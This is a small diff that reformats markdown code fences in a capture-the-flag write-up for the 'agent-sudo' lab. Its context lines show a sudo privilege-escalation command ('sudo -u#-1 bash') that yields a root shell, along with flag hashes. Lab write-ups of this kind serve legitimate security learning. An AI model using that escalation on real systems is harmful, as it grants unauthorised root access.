@@ -323,9 +323,10 @@ b03d975e8c92a7c04146cfa7a5a313c7
 > james@agent-sudo:~$ sudo -u#-1 bash
 [sudo] password for james: 
 root@agent-sudo:~# 
-> ```
-> Got the root flag too.
-> root@agent-sudo:~# ls
+>```
+>Got the root flag too.
+>```
+>root@agent-sudo:~# ls
 Alien_autospy.jpg  user_flag.txt
 root@agent-sudo:~# cd ..
 root@agent-sudo:/home# cd ..
@@ -345,5 +346,6 @@ b53a02f55b57d4439e3341834d70c062
 By,
 DesKel a.k.a Agent R
 root@agent-sudo:/root# 
+>```
 
 
